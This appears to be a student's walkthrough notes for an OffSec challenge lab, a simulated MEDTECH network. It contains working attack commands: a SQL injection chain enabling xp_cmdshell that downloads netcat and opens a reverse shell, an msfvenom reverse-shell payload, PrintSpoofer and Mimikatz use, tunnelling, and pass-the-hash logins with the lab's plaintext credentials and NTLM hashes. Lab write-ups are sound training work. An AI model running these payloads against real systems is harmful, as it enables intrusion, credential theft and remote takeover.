# Preamble
**Challenge Lab 1: MEDTECH**: You have been tasked to conduct a penetration test for MEDTECH, a recently formed IoT healthcare startup. Your objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.

We have been tasked to conduct a penetration test for MEDTECH a recently formed IoT healthcare startup. Our objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.

The organization topology diagram is shown below and the public subnet network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.

![[Pasted image 20250209143016.png]]
# Initial Scan
## 192.168.161.120 (WEB01.DMZ)
```json
# Nmap 7.95 scan initiated Sun Feb  9 14:37:03 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -T4 -oN nmap_120.txt 192.168.161.120
Nmap scan report for 192.168.161.120
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
|_http-title: PAW! (PWK Awesome Website)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT     ADDRESS
1   4.70 ms 192.168.45.1
2   4.57 ms 192.168.45.254
3   5.26 ms 192.168.251.1
4   5.51 ms 192.168.161.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  9 14:37:27 2025 -- 1 IP address (1 host up) scanned in 23.93 seconds
```
## 192.168.161.121 (WEB02.DMZ)
```json
# Nmap 7.95 scan initiated Sun Feb  9 14:37:13 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -T4 -oN nmap_121.txt 192.168.161.121
Nmap scan report for 192.168.161.121
Host is up (0.011s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MedTech
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-09T06:38:39
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   4.83 ms  192.168.45.1
2   4.77 ms  192.168.45.254
3   51.98 ms 192.168.251.1
4   52.10 ms 192.168.161.121

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  9 14:38:44 2025 -- 1 IP address (1 host up) scanned in 90.87 seconds
```
## 192.168.161.122 (VPN.DMZ)
```json
# Nmap 7.95 scan initiated Sun Feb  9 14:37:28 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -T4 -oN nmap_122.txt 192.168.161.122
Nmap scan report for 192.168.161.122
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
1194/tcp open  openvpn?
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   4.14 ms   192.168.45.1
2   4.24 ms   192.168.45.254
3   743.80 ms 192.168.251.1
4   744.02 ms 192.168.161.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  9 14:37:49 2025 -- 1 IP address (1 host up) scanned in 21.97 seconds
```
# 192.168.161.120 (WEB01)
## Enumeration
- HTTPd web server found named WEBrick httpd 1.6.1
	- PWK Awesome Website
- WhatWeb output for underlying web mechanisms
	```shell
	┌──(kali㉿kali)-[~/Desktop/Medtech]
	└─$ whatweb http://192.168.161.120
	http://192.168.161.120 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)], IP[192.168.161.120], Open-Graph-Protocol[website], Ruby[2.7.4,WEBrick/1.6.1], Script[application/ld+json], Title[PAW! (PWK Awesome Website)]
	```
- GoBuster Directory Enumeration
	![[Pasted image 20250209145552.png]]
# 192.168.161.121 (WEB02)
## Enumeration
- HTTP IIS 10.0 Web server
	- MedTech home page\
	- Uses aspx
- WhatWeb
	```shell
	┌──(kali㉿kali)-[~/Desktop/Medtech]
	└─$ whatweb http://192.168.161.121
	http://192.168.161.121 [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.161.121], JQuery[1.12.4], Meta-Author[Offensive Security], Microsoft-IIS[10.0], Modernizr[3.5.0.min], Script, Title[MedTech][Title element contains newline(s)!], X-Powered-By[ASP.NET], X-UA-Compatible[ie=edge]
	```
- Has WinRM port (5985)
- Login.aspx is vulnerable to SQL injection in the Username field:
	```sql
	# Check and Enable xp_cmdshell
	';EXECUTE sp_configure 'show advanced options',1--
	';RECONFIGURE;--
	';EXECUTE sp_configure 'xp_cmdshell',1--
	';RECONFIGURE;--
	
	# Download nc onto the target machine
	';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.236:80/nc.exe c:/windows/temp/nc64.exe";--
	
	# Run reverse shell
	';EXEC xp_cmdshell "c:/windows/temp/nc64.exe -e cmd.exe 192.168.45.236 4444";--
	```
## Initial Access
- Reverse shell in as NT SERVICE\MSSQL$SQLEXPRESS
- Found users in C:\Users
	- Administrator
	- administrator.MEDTECH
	- joe
	- offsec
- Upload winPEASx64.exe and run
	- ???
- Found password string in C:\inetpub\wwwroot\web.config
	- password=WhileChirpTuesday218

## Privilege Escalation
- NT SERVICE\MSSQL$SQLEXPRESS has SeImpersonatePrivilege, use PrintSpoofer
	- `.\PrintSpoofer.exe -i -c powershell.exe`
	- Escalated to NT AUTHORITY\SYSTEM
## Flag
- Proof.txt found in Administrator Desktop
	![[Pasted image 20250209161731.png]]
- Look at the IPConfig, internal server? (surprise surprise you can literally see it from the list of VMs)
## Post-Exploitation
- Upload and run Mimikatz
	- Found credentials
	- joe:Flowers1
## Pivoting
- Setup tunnel with chisel v1.7.1
```shell
# Download both linux and win binaries to Kali
kali@kali:~$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
kali@kali:~$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz

# Unzip and rename both
kali@kali:~$ gunzip chisel_1.7.7_linux_amd64 && mv chisel_1.7.7_linux_amd64 chisel 
kali@kali:~$ gunzip chisel_1.7.7_windows_amd64 && mv chisel_1.7.7_windows_amd64 chisel.exe

# Add executable in Kali and run
kali@kali:~$ chmod a+x chisel
kali@kali:~$ ./chisel server --port 8081 --socks5 --reverse
# Remember to edit /etc/proxychains4.conf!

# Transfer and run chisel client in WEB02
C:\TEMP> .\chisel.exe client --max-retry-count 1 192.168.45.236:8081 R:socks
```

# Searching for Entry Point in Internal Network
```shell
kali@kali:~$ proxychains crackmapexec winrm 172.16.161.0/24 -u joe -p 'Flowers1' -d medtech.com --continue-on-success
```
- Found 7 hosts (listed in the VM list on Offsec Portal):
	- 172.16.161.10 (DC01)
	- 172.16.161.11 (FILES02)
	- 172.16.161.12 (DEV04)
	- 172.16.161.13 (PROD01)
	- 172.16.161.14 (not found)
	- 172.16.161.82 (CLIENT01)
	- 172.16.161.83 (CLIENT02)
- We have access (and Pwn3d!) on 172.16.161.11 as joe
# 172.16.161.11 (FILES02)
## Initial Access & Flag
- Evil-WinRM into the machine with joe credentials
- Find local.txt on joe's desktop
	![[Pasted image 20250209174951.png]]
- Since joe is a local admin, we can get proof.txt on the Administrator desktop too
	![[Pasted image 20250209175132.png]]
## Enumeration
- In joe's Documents folder, there is a fileMonitorBackup.log file
- Download it to Kali for inspection
%% I continued on a different day here, so different IPs %%
- A lot of logs but found hidden NTLM hashes inside for:
	- daisy:abf36048c1cf88f5603381c5128feb8e
	- toad:5be63a865b65349851c1f11a067a3068
	- wario:fdf36048c1cf88f5630381c5e38feb8e
	- goomba:8e9e1516818ce4e54247e71e71b5f436
- Test using crackmapexec
	- Use SMB to wide scan instead of WINRM due to Python error
		![[Pasted image 20250211150150.png]]
	- Only wario has access to ALL SMB
	- Found users via crackmapexec
		![[Pasted image 20250211150015.png]]
	- Wario is an administrator of .83
	![[Pasted image 20250211150322.png]]

# 172.16.111.83 (CLIENT02)
## Initial Access
- Evil-WinRM into the machine with wario credentials
	```
	┌──(kali㉿kali)-[~/Desktop/Medtech]
	└─$ evil-winrm -i 172.16.111.83 -u wario -H fdf36048c1cf88f5630381c5e38feb8e
	```
## Flag 1
- local.txt in wario Desktop
	![[Pasted image 20250211150750.png]]
- Apparently despite being Pwn3d! we do not have administrator access yet
## Enumeration
- Setup reverse shell, transfer over and run
```shell
# Create reverse shell with MSFVenom
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.111.254 LPORT=5555 -f exe > revsh_5555.exe
# Rev shell pointed to the pivot machine, now need to forward that port on the pivot machine through the ligolo tunnel

# Setup listener on pivot machine via ligolo proxy
ligolo-ng>> listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:5555 --tcp
# Then transfer and execute the 
```
- Upload winPEAS and run:
	- EHEHE FOUND A CUTE EXECUTABLE
	![[Pasted image 20250211153356.png]]
	- FOUND THE SERVICE
	![[Pasted image 20250211155259.png]]
## Privilege Escalation
- We have full access to C:\DevelopmentExecutables\auditTracker.exe and the folder its in
- Replace the auditTracker.exe with a reverse shell
- Restart the service:
	```powershell
	PS C:\Users\wario> sc.exe stop auditTracker
	PS C:\Users\wario> sc.exe start auditTracker
	```

# i stopped here again bc fu-